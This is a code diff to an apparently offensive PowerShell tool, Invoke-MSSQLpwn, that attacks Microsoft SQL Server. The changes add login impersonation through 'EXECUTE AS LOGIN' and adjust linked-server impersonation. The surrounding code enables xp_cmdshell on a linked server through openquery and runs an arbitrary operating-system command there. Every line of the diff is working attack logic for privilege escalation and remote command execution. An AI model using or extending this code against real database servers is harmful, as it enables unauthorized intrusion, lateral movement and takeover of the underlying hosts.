@@ -278,6 +278,11 @@ Function Invoke-MSSQLpwn{
         if ($Mode -eq 2){
         } else {
             if ($PSBoundParameters.ContainsKey('Impersonate')){
+            $sqlCmd.CommandText = "EXECUTE AS LOGIN = '{0}';" -f $Impersonate;
+            $reader = $sqlCmd.ExecuteReader()
+            $reader.Close()
+            }
+            if ($PSBoundParameters.ContainsKey('LinkImpersonate')){
                 $sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;EXECUTE AS LOGIN = ''''{1}'''';EXEC sp_configure ''''show advanced options'''', 1; RECONFIGURE;'')' -f $Link,$LinkImpersonate
             }else {
                 $sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;EXEC sp_configure ''''show advanced options'''', 1; RECONFIGURE;'')' -f $Link
@@ -285,7 +290,7 @@ Function Invoke-MSSQLpwn{
             $reader = $sqlCmd.ExecuteReader()
             $reader.Close()
 
-            if ($PSBoundParameters.ContainsKey('Impersonate')){
+            if ($PSBoundParameters.ContainsKey('LinkImpersonate')){
                 $sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;EXECUTE AS LOGIN = ''''{1}'''';EXEC sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'')' -f $Link,$LinkImpersonate
             }else {
                 $sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;EXEC sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'')' -f $Link
@@ -293,7 +298,7 @@ Function Invoke-MSSQLpwn{
             $reader = $sqlCmd.ExecuteReader()
             $reader.Close()
 
-            if ($PSBoundParameters.ContainsKey('Impersonate')){
+            if ($PSBoundParameters.ContainsKey('LinkImpersonate')){
                 $sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;EXECUTE AS LOGIN = ''''{1}'''';EXEC xp_cmdshell ''''{2}'''';'')' -f $Link,$LinkImpersonate,$Command
             }else {
                 $sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;EXEC xp_cmdshell ''''{1}'''';'')' -f $Link,$Command
